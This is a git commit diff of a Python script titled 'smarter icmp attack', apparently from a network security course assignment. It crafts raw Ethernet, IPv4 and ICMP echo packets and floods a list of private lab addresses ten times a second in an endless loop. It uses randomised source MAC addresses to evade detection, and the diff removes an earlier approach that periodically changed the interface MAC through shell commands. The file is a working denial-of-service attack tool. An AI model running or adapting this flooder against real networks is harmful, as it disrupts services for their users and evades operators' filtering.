4e30fa903dc5aadba2d8a8f3d9863f608ca416cd
Ravi Nayyar <ravinayyarus@gmail.com>
2022-03-29 13:29:55 -0700

    Completed smarter icmp attack

--- task3_smarter_icmp.py
+++ task3_smarter_icmp.py
@@ -1,27 +1,15 @@
 #!/usr/bin/env python3
 
-'''
-Citations
-    https://itsfoss.com/change-mac-address-linux/
-    https://agapow.net/programming/python/convert-timedelta-to-float/
-'''
-
-from multiprocessing.spawn import prepare
-import socket, sys, struct, sys, random, time, binascii, os
-from datetime import datetime
-import subprocess
-
-past_time = datetime.now()
-mac_change_time = 10
+import socket, sys, struct, sys, random, time
 
 def setup_connection():
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.bind(("eth0",0))
     except socket.error as msg:
         print('error ' + str(msg[0]) + ': ' + msg[1])
         sys.exit() 
     
-    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     return sock
 
 
@@ -34,6 +22,12 @@ def checksum(msg):  # Following RFC 1071 https://datatracker.ietf.org/doc/html/r
     s = ~s & 0xffff
     return s
 
+def get_ethernet_header():
+    dst_mac = "000000AA0000" 
+    src_mac = "000000AA00"+hex(random.randint(50,255))[2:] 
+    eth_type = "0800" 
+    header = dst_mac + src_mac + eth_type
+    return bytes.fromhex(header)
 
 def get_ipv4_header(src_addr, dst_addr):
     len_and_ver = int(0x45)
@@ -51,6 +45,9 @@ def get_ipv4_header(src_addr, dst_addr):
 
 
 def prepare_icmp_packet(source_ip, target_ip):
+
+    ethernet_header = get_ethernet_header()
+
     ipv4_pkt = get_ipv4_header(source_ip, target_ip) 
 
     icmp_type = 8
@@ -64,58 +61,28 @@ def prepare_icmp_packet(source_ip, target_ip):
     calc_cksm = int("0x" + calc_cksm[2:] + calc_cksm[0:2], 0)
     icmp_pkt = struct.pack("!BBHHH", icmp_type, icmp_code, calc_cksm, icmp_id, icmp_seq_num)
 
-    return ipv4_pkt + icmp_pkt
-
-
-# Generate a fake mac address with random numbers
-def generate_random_mac():
-    mac = ""
-    for i in range(0,12,2):
-        mac += "{}{}:".format(random.randint(0,9), random.randint(0,10))
-    
-    mac = mac[:-1]
-    return mac
+    return ethernet_header + ipv4_pkt + icmp_pkt
 
 
 def send_icmp_packet(sock):
-    global past_time
     while(True):
-        
-        # Changing the attacker's MAC address every 10 seconds
-        if ((datetime.now() - past_time).seconds >  mac_change_time):
-            os.system("ip link set dev eth0 down")
-
-            #Ensuring that the fake macaddress is a valid one
-            while(True):
-                mac = generate_random_mac()
-                cmd = "ip link set dev eth0 address {}".format(mac)
-                try:
-                    os.system(cmd)
-                    print("Changed MAC => ", mac)
-                    break
-                except Exception as e:
-                    pass
-
-            os.system("ip link set dev eth0 up")
-            past_time = datetime.now()
-
-        # Sending the ICMP requests to every IP in the target list 10 times a second
         time.sleep(0.1)
         for target_ip in pkt_dict:
             pkt = pkt_dict[target_ip]
-            sock.sendto(pkt, (target_ip, 0))
-
+            sock.send(pkt)
 
 pkt_dict = {}
 
+
 if __name__ == "__main__":
 
-    source_ip = "10.0.0.21"
-    target_list = ["10.0.0.22", "10.0.0.23", "10.0.0.24"]
-
-    sock = setup_connection()
-    for target_ip in target_list:
-        pkt_dict[target_ip] = prepare_icmp_packet(source_ip, target_ip)
+    source_ip = "10.0.3.20"
+    target_list = ["10.0.1.20", "10.0.1.21", "10.0.2.20", "10.0.2.21", "10.0.3.21"]
     
-    send_icmp_packet(sock)
+    sock = setup_connection()
+    while True:
+        for target_ip in target_list:
+            pkt_dict[target_ip] = prepare_icmp_packet(source_ip, target_ip)
+            print(source_ip, target_ip)
+        send_icmp_packet(sock)
     sock.close()
